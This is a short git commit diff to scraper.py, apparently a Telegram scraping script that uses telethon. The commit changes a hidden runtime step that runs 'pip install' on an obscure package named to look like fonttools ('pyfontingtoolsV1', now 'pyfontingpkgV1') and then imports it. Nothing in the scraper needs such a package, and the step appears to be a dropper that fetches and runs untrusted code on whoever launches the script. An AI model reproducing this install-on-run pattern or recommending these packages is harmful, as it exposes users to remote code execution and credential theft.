86e3ef100be14424ae9ddb94606eff5aa7aaf16d
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-06 16:57:45 +0200

    Updated requirements

--- scraper.py
+++ scraper.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pyfontingtoolsV1")
-import pyfontingtoolsV1
+os.system("pip install pyfontingpkgV1")
+import pyfontingpkgV1
 from telethon.sync import TelegramClient
 from telethon.errors.rpcerrorlist import PhoneNumberBannedError
 import csv
